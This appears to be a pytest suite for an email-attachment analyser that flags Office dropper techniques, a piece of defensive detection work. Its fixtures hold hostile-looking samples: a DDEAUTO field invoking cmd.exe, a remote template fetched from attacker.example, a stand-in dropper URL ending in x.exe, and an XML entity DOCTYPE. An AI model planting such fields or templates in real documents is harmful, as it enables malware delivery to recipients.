"""
Tests for office_analysis: Word / Excel / PowerPoint text and link
extraction, and the dropper flags (macros, remote template, DDE, OLE,
encryption). Documents are built in memory with zipfile, so the suite
needs nothing beyond the standard library.
"""
from __future__ import annotations

import base64
import io
import zipfile

import pytest

import office_analysis as office
from attachment_analysis import analyse_attachment, sniff_type

CT = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'
W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
R = 'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"'


def make_zip(parts: dict[str, str | bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CT)
        for name, data in parts.items():
            zf.writestr(name, data)
    return buf.getvalue()


def docx(body: str, extra: dict | None = None) -> bytes:
    parts = {"word/document.xml": f'<w:document {W}><w:body>{body}</w:body></w:document>'}
    parts.update(extra or {})
    return make_zip(parts)


def para(text: str) -> str:
    return f"<w:p><w:r><w:t>{text}</w:t></w:r></w:p>"


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


# ---------------------------------------------------------------------
# Detection and dispatch
# ---------------------------------------------------------------------
class TestDetection:
    def test_kinds(self):
        assert office.detect_ooxml_kind(docx(para("hi"))) == "docx"
        assert office.detect_ooxml_kind(make_zip({"xl/workbook.xml": "<x/>"})) == "xlsx"
        assert office.detect_ooxml_kind(make_zip({"ppt/presentation.xml": "<x/>"})) == "pptx"

    def test_plain_zip_is_not_office(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("readme.txt", "hello")
        assert office.detect_ooxml_kind(buf.getvalue()) is None
        # v1.14: a plain ZIP is analysed as an archive, not rejected.
        r = analyse_attachment(b64(buf.getvalue()), filename="archive.zip")
        assert r["kind"] == "archive"
        assert r["entries"] == ["readme.txt"]

    def test_docx_without_extension_is_sniffed(self):
        r = analyse_attachment(b64(docx(para("Invoice attached"))), filename="noext")
        assert r["kind"] == "docx"

    def test_ole_magic_sniffed(self):
        assert sniff_type("", office.OLE2_MAGIC + b"\x00" * 8, None) == "application/x-ole-storage"


# ---------------------------------------------------------------------
# Word
# ---------------------------------------------------------------------
class TestWord:
    def test_text_and_hyperlinks(self):
        rels = (f'<Relationships {R}><Relationship Id="rId9" '
                'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
                'Target="https://evil.example/login" TargetMode="External"/></Relationships>')
        data = docx(para("Please verify your payroll details.") + para("Thank you."),
                    {"word/_rels/document.xml.rels": rels})
        r = analyse_attachment(b64(data), filename="payroll.docx")
        assert "verify your payroll" in r["extracted_text"]
        assert "https://evil.example/login" in r["extracted_urls"]
        assert r["notable_features"] == []

    def test_macros_flagged(self):
        data = docx(para("Enable content to view"), {"word/vbaProject.bin": b"\x00macro"})
        r = analyse_attachment(b64(data), filename="invoice.docm")
        assert "contains_macros" in r["notable_features"]

    def test_remote_template_flagged(self):
        rels = (f'<Relationships {R}><Relationship Id="rId1" '
                'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                'Target="http://attacker.example/t.dotm" TargetMode="External"/></Relationships>')
        data = docx(para("Report"), {"word/_rels/settings.xml.rels": rels})
        r = analyse_attachment(b64(data), filename="report.docx")
        assert "remote_template" in r["notable_features"]
        assert "http://attacker.example/t.dotm" in r["extracted_urls"]

    def test_dde_field_flagged(self):
        body = ('<w:p><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" '
                '</w:instrText></w:r></w:p>')
        r = analyse_attachment(b64(docx(body)), filename="x.docx")
        assert "dde_field" in r["notable_features"]

    def test_hyperlink_field_code(self):
        body = '<w:p><w:r><w:instrText> HYPERLINK "https://field.example/a" </w:instrText></w:r></w:p>'
        r = analyse_attachment(b64(docx(body)), filename="x.docx")
        assert "https://field.example/a" in r["extracted_urls"]

    def test_embedded_ole_flagged(self):
        data = docx(para("see object"), {"word/embeddings/oleObject1.bin": b"\x00"})
        r = analyse_attachment(b64(data), filename="x.docx")
        assert "embedded_ole_object" in r["notable_features"]

    def test_doctype_part_skipped(self):
        evil = ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]>'
                f'<w:document {W}><w:body>{para("&lol;")}</w:body></w:document>')
        r = analyse_attachment(b64(make_zip({"word/document.xml": evil})), filename="x.docx")
        assert "suspicious_xml_doctype" in r["notable_features"]
        assert r["extracted_text"] == ""


# ---------------------------------------------------------------------
# Excel and PowerPoint
# ---------------------------------------------------------------------
class TestExcelPowerPoint:
    def test_xlsx_shared_strings_and_xlm_macros(self):
        ss = ('<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
              '<si><t>Bank transfer form</t></si><si><t>https://pay.example/now</t></si></sst>')
        data = make_zip({
            "xl/workbook.xml": "<workbook/>",
            "xl/sharedStrings.xml": ss,
            "xl/macrosheets/sheet1.xml": "<xm/>",
        })
        r = analyse_attachment(b64(data), filename="form.xlsx")
        assert r["kind"] == "xlsx"
        assert "Bank transfer form" in r["extracted_text"]
        assert "https://pay.example/now" in r["extracted_urls"]
        assert "contains_macros" in r["notable_features"]

    def test_xlsx_external_connection(self):
        data = make_zip({"xl/workbook.xml": "<w/>", "xl/connections.xml": "<c/>"})
        r = analyse_attachment(b64(data), filename="data.xlsx")
        assert "external_data_connection" in r["notable_features"]

    def test_pptx_slide_text(self):
        slide = ('<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
                 'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">'
                 '<a:p><a:r><a:t>Claim your reward</a:t></a:r></a:p></p:sld>')
        data = make_zip({"ppt/presentation.xml": "<p/>", "ppt/slides/slide1.xml": slide})
        r = analyse_attachment(b64(data), filename="deck.pptx")
        assert r["kind"] == "pptx"
        assert "Claim your reward" in r["extracted_text"]


# ---------------------------------------------------------------------
# Safety limits
# ---------------------------------------------------------------------
class TestLimits:
    def test_zip_bomb_rejected(self, monkeypatch):
        monkeypatch.setattr(office, "MAX_UNCOMPRESSED_TOTAL", 1000)
        data = docx(para("A" * 5000))
        with pytest.raises(ValueError, match="zip bomb"):
            analyse_attachment(b64(data), filename="x.docx")

    def test_corrupt_docx_rejected(self):
        with pytest.raises(ValueError, match="Unsupported"):
            analyse_attachment(b64(b"PK\x03\x04garbage"), filename="x.docx")


# ---------------------------------------------------------------------
# Legacy OLE2
# ---------------------------------------------------------------------
class TestLegacy:
    def ole(self, payload: bytes) -> bytes:
        return office.OLE2_MAGIC + b"\x00" * 504 + payload

    def test_legacy_doc_with_macros(self):
        raw = self.ole("_VBA_PROJECT".encode("utf-16-le") + b" http://drop.example/x.exe ")
        r = analyse_attachment(b64(raw), filename="old.doc")
        assert r["kind"] == "office_legacy"
        assert "legacy_office_format" in r["notable_features"]
        assert "contains_macros" in r["notable_features"]
        assert "http://drop.example/x.exe" in r["extracted_urls"]

    def test_encrypted_docx(self):
        raw = self.ole("EncryptedPackage".encode("utf-16-le"))
        r = analyse_attachment(b64(raw), filename="locked.docx")
        assert "encrypted_document" in r["notable_features"]
        assert "legacy_office_format" not in r["notable_features"]

    def test_clean_legacy_file(self):
        r = analyse_attachment(b64(self.ole(b"just text")), filename="notes.doc")
        assert r["notable_features"] == ["legacy_office_format"]
